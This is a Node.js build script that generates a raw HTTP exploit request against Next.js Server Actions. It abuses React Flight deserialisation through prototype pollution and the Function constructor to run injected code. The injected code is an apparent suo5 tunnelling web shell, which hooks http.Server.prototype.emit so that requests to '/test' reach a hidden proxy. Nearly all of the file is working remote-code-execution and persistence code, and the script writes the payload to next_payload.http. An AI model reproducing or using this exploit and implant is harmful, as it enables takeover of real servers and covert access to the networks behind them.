'use strict';

const fs = require('fs');
const path = require('path');

const directory = path.resolve(__dirname, '../../assets/nodejs');
const canonicalPath = path.join(directory, 'suo5.js');
const source = fs.readFileSync(canonicalPath, 'utf8').replace(/\r\n/g, '\n');
const checkOnly = process.argv.includes('--check');

const requireBlock = [
    "const http = require('http');",
    "const https = require('https');",
    "const net = require('net');",
    "const os = require('os');"
].join('\n');

const commonJsInjectionBlock = [
    'const reqFn = process.mainModule ? process.mainModule.require : require;',
    "const http = reqFn('http');",
    "const https = reqFn('https');",
    "const net = reqFn('net');",
    "const os = reqFn('os');"
].join('\n');

const routeHook = `
if (!http.Server.prototype.__suo5_patched) {
    const originalEmit = http.Server.prototype.emit;
    http.Server.prototype.emit = function (type, req, res) {
        if (type === 'request' && req && typeof req.url === 'string' && req.url.split('?')[0] === '/test') {
            processRequest(req, res).catch(() => {
                if (!res.headersSent) res.writeHead(500);
                if (!res.writableEnded) res.end();
            });
            return true;
        }
        return originalEmit.apply(this, arguments);
    };
    http.Server.prototype.__suo5_patched = true;
}
`;

function withoutStandaloneServer(value) {
    return value
        .replace(/\/\/ SUO5_SERVER_START[\s\S]*?\/\/ SUO5_SERVER_END\n?/, '')
        .replace(/\/\/ SUO5_LISTEN_START[\s\S]*?\/\/ SUO5_LISTEN_END\n?/, '');
}

function buildNextPayload() {
    let body = withoutStandaloneServer(source)
        .replace("'use strict';\n\n", '')
        .replace(requireBlock, commonJsInjectionBlock)
        .trim();
    const prefix = `if (!global.__suo5_loaded) {\n${body}\n${routeHook}\nglobal.__suo5_loaded = true;\n}\nthrow Object.assign(new Error('NEXT_REDIRECT'), { digest: 'NEXT_REDIRECT;push;/login?a=suo5;307;' });`;
    // Compile without executing so a generated exploit payload can never drift into invalid JavaScript.
    new Function(prefix);
    const model = {
        then: '$1:__proto__:then',
        status: 'resolved_model',
        reason: -1,
        value: '{"then":"$B1337"}',
        _response: {
            _prefix: prefix,
            _chunks: '$Q2',
            _formData: { get: '$1:constructor:constructor' }
        }
    };
    const boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad';
    const multipart = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        JSON.stringify(model),
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}`,
        'Content-Disposition: form-data; name="2"',
        '',
        '[]',
        `--${boundary}--`,
        ''
    ].join('\r\n');
    const headers = [
        'POST / HTTP/1.1',
        'Host: localhost:3000',
        'User-Agent: Mozilla/5.0',
        'Next-Action: x',
        'X-Nextjs-Request-Id: b5dce965',
        `Content-Type: multipart/form-data; boundary=${boundary}`,
        'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9',
        `Content-Length: ${Buffer.byteLength(multipart)}`,
        '',
        ''
    ].join('\r\n');
    return headers + multipart;
}

const generated = new Map([
    [path.join(directory, 'next_payload.http'), buildNextPayload()]
]);

let stale = false;
for (const [file, expected] of generated) {
    const current = fs.existsSync(file) ? fs.readFileSync(file, 'utf8').replace(/\r\n/g, '\n') : null;
    const normalizedExpected = expected.replace(/\r\n/g, '\n');
    if (current === normalizedExpected) continue;
    stale = true;
    if (!checkOnly) fs.writeFileSync(file, expected);
    console.error(`${checkOnly ? 'stale' : 'generated'}: ${path.basename(file)}`);
}

if (checkOnly && stale) process.exit(1);
